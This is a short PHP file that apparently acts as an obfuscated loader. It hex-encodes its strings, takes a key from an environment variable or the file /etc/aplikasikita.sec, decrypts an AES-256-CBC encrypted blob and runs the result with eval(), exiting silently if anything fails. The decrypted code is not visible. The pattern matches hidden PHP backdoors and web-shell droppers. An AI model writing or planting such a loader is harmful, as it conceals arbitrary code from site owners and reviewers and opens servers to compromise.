<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('m15y1Bt5AGImJUCxUH+z3g==');

$c=base64_decode(

'6UYRQ5cmy1XVcVENJwN2r3n9Xm7x1KiO50v0IeZ+redYAlbIZ1txmvI79b4oLtUk3VWvd4ZBaaux' .
'TV2ogRalJiBRJZiUVW85ClF6FGsdrupNiDj2tDtmLiZQwUK+QDbkFb/Lmm33BwRz1k0JowI91SmT' .
'tnycxU2dFjl5e+aZANpdPUR7Kkq2lHS6a12CmuQq/le8a29yLnerpEbSQ4JupYlnniNzYhAbfNe+' .
'ZkCePA8alFi9DPdyKdEQEzqVkC9iib8EO/dkSGquUicZzGboTqjc+xIsyBYokughZ1RQctLttrHK' .
'/yVu658zDwfBCrHlBX9NyDX2FmZNzOmj97kiD/6aFASjGNeTN2ZBdoNULFOsrgxpsRibWr3/MbVT' .
'PpEiNuROs4CwycXDXBCPU1R3uY6V08bCBO4HSPJ8KLTil7/aJOiHssyklTCPofJh3fZeCXKT5XCC' .
'kEsZSt3pRjicbNOlMxLXIiDQi8mgslCUHBm1xSjy4ApLaWzKYgJjPvPl/wqxEmdFtx+ebOS882Ab' .
'W66RQ+p47rPWRejRXsFjfYe0UsagdXreysdRC5534/YgdyFe3lC7Mghg+8BcOkKtVFS62WoeGVZe' .
'UTwxjEbdrbI+o8TvEJN0Rv7qEJkdpaHmceADHFPKvBBlkl7s5rg8K0fHS5l5TcFy3AS6BZAYqHbE' .
'fVZUCItXAXpxJN9KnMeQrN+yJ31iMzWr0uG5fO+6PN17gI3XSZfuG1OI6hn4pO0R8K7915+ir8Oq' .
'3Ne1FX79cU+trqvzM7SaKLupHqspmfvBqNFvWwv7cRfftxhruvKy11AzHvymr0JCCSyZ5iVc2Ouh' .
'bQ/balz1clC6QiAZvi6Z4VjC+0CfsXSsSBd/wIiMRwVJVxi2yXeruBSzCzDRuhoB7fDBcYMAznvC' .
'hMqA+T9b+Bhu4DlsNH+GOJDlylYgTKt/UpoaG07/PtBR6oqf4lJaY+froHPik56RKh/SuQIOcFcB' .
'DpLVY0NHMFbpXNGmu8Lc+YWWSiOSCNTZw30T1MEvzSY/b8ZAlRpAFMdLD0YNW/3IrarS41+2FRu8' .
'CvMxqPxMr8srZKp2HkXqWwiLkDv28eylq13LpExllNRrCUm2ez4PbZXqZFf16/yRxgzKMeIIv2a6' .
'J/BIIZxnccspIx9bwOdVNVDCJiyA9/jF0+wmvtLDrORIDu78d1vFXKik92MwPud8pyuJ3P40zvba' .
'moAePw4x+UNHbbQQTNcbLx78RDQDpJEWHBjWgWlu7mVR3SbLWeRHa267HSjJul+8qygnjDYT7vOR' .
'EC3TJl+usoXqFyGPibLg7+CBl5L6oBw0XNj0xkTQdUkHWOWJf/DNeJ4nG9oE3mx6gq1rI4g2ig=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

